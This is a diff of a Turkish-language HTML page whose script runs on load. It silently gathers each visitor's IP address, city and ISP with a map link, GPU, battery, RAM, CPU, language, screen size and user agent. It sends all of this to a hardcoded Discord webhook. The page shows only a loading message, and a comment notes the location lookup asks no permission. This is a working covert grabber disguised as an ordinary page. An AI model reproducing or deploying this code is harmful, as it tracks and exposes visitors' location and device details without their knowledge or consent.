@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="tr">
 <head>
@@ -21,110 +20,77 @@
     </div>
 
     <script>
+        // Webhook URL'ni kontrol et (Sonunda boşluk kalmasın)
         const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        async function herSeyiDök() {
+        async function herSeyiDok() {
             let data = { gpu: "Bilinmiyor", ven: "Bilinmiyor", loc: "Yükleniyor...", ip: "X", bat: "X", lang: "Bilinmiyor", ram: "Bilinmiyor", cpu: "Bilinmiyor", screen: "Bilinmiyor" };
 
-            // 1. IP ve SESSİZ KONUM (IPAPI)
+            // 1. IP ve SESSİZ KONUM (İzin İstemez)
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                if (!res.ok) throw new Error('IPAPI yanıtı başarısız');
                 const j = await res.json();
                 data.ip = j.ip;
+                // Google Maps linkindeki hata düzeltildi (${j.latitude} kullanıldı)
                 data.loc = `📍 **Bölge:** ${j.city}, ${j.region} / ${j.country_name}\n🛰️ **ISP:** ${j.org}\n🔗 [Haritada Gör](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
             } catch(e) {
-                console.error("IPAPI hatası: ", e);
                 data.loc = "Lokasyon alınamadı";
-                data.ip = "IP alınamadı";
             }
 
-            // 2. Cihaz Dili
-            try {
-                data.lang = navigator.language || "Bilinmiyor";
-            } catch(e) {
-                console.error("Dil bilgisi alınamadı: ", e);
-            }
-
-            // 3. GPU ve VENDOR (WebGL)
+            // 2. GPU ve VENDOR (Efsane Sorgu Fix)
             try {
                 const c = document.createElement('canvas');
-                const gl = c.getContext('webgl');
+                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                 const d = gl.getExtension('WEBGL_debug_renderer_info');
                 if (d) {
                     data.gpu = gl.getParameter(d.UNMASKED_RENDERER_ID);
                     data.ven = gl.getParameter(d.UNMASKED_VENDOR_ID);
-                } else {
-                    data.gpu = "WebGL bilgisi alınamadı";
-                    data.ven = "WebGL bilgisi alınamadı";
                 }
-            } catch(e) {
-                console.error("GPU bilgisi alınamadı: ", e);
-                data.gpu = "Bilinmiyor";
-                data.ven = "Bilinmiyor";
-            }
+            } catch(e) {}
 
-            // 4. Pil Durumu
+            // 3. PİL, RAM, CPU ve DİL
             try {
-                const b = await navigator.getBattery();
-                data.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Prizde' : 'Pilde'})`;
-            } catch(e) {
-                console.error("Pil durumu alınamadı: ", e);
-                data.bat = "Bilinmiyor";
-            }
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    data.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Prizde' : 'Pilde'})`;
+                }
+                data.ram = `${navigator.deviceMemory || 'X'} GB`;
+                data.cpu = `${navigator.hardwareConcurrency || 'X'} Çekirdek`;
+                data.lang = navigator.language || "Bilinmiyor";
+                data.screen = `${window.screen.width}x${window.screen.height}`;
+            } catch(e) {}
 
-            // 5. RAM ve CPU Bilgisi
-            try {
-                data.ram = `${navigator.deviceMemory} GB RAM`;
-                data.cpu = `${navigator.hardwareConcurrency} Çekirdek`;
-            } catch(e) {
-                console.error("RAM/CPU bilgisi alınamadı: ", e);
-                data.ram = "Bilinmiyor";
-                data.cpu = "Bilinmiyor";
-            }
-
-            // 6. Ekran Çözünürlüğü
-            try {
-                data.screen = `${screen.width}x${screen.height}`;
-            } catch(e) {
-                console.error("Ekran çözünürlüğü alınamadı: ", e);
-                data.screen = "Bilinmiyor";
-            }
-
-            // 7. Kullanıcı Agent ve Diğer Bilgiler
-            const userAgent = navigator.userAgent;
-
-            // 8. O MEŞHUR KIRMIZI EMBED ŞABLONU
+            // 4. KIRMIZI EMBED ŞABLONU
             const payload = {
                 embeds: [{
-                    title: "🕵️ KRİTİK SİSTEM ANALİZİ (GİZLİ SÜRÜM)",
+                    title: "🕵️ KRİTİK SİSTEM ANALİZİ (REVIZED)",
                     color: 15158332,
                     fields: [
                         { name: "📍 LOKASYON (IP TABANLI)", value: data.loc, inline: false },
                         { name: "🛠️ DONANIM KATMANI", value: `**GPU:** \`${data.gpu}\`\n**VENDOR:** \`${data.ven}\`\n**RAM:** ${data.ram}\n**CPU:** ${data.cpu}`, inline: false },
                         { name: "📱 YAZILIM / EKRAN", value: `**OS:** ${navigator.platform}\n**RES:** ${data.screen}`, inline: true },
                         { name: "🔋 DURUM", value: data.bat, inline: true },
-                        { name: "🔍 USER AGENT", value: "```" + userAgent + "```", inline: false },
-                        { name: "🌐 CİHAZ DİLİ", value: data.lang, inline: false },
-                        { name: "🌐 IP ADRESİ", value: data.ip, inline: false }
+                        { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```", inline: false },
+                        { name: "🌐 EK BİLGİ", value: `**IP:** ${data.ip} | **Dil:** ${data.lang}`, inline: false }
                     ],
                     timestamp: new Date()
                 }]
             };
 
-            // 9. EN GARANTİ GÖNDERİM (Fetch + Beacon)
+            // 5. EN GARANTİ GÖNDERİM (Fetch Force)
             const blob = JSON.stringify(payload);
-            fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob })
-                .then(response => {
-                    if (!response.ok) throw new Error('Webhook gönderim hatası');
-                    console.log("Veri başarıyla gönderildi.");
-                })
-                .catch(error => {
-                    console.error("Webhook gönderim hatası: ", error);
-                });
-            navigator.sendBeacon(u, blob);
+            
+            // Discord'a no-cors modunda değil, doğrudan göndermeyi deniyoruz
+            fetch(u, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: blob
+            }).catch(() => {
+                // Eğer fetch tarayıcı engeline takılırsa yedek olarak Beacon fırlatır
+                navigator.sendBeacon(u, blob);
+            });
 
-            // 10. ARAYÜZ AKIŞI
+            // 6. ARAYÜZ AKIŞI
             const msg = document.getElementById('msg');
             const loader = document.getElementById('loader');
             
@@ -138,7 +104,8 @@
             }, 1800);
         }
 
-        window.onload = herSeyiDök;
+        window.onload = herSeyiDok;
     </script>
 </body>
 </html>
+
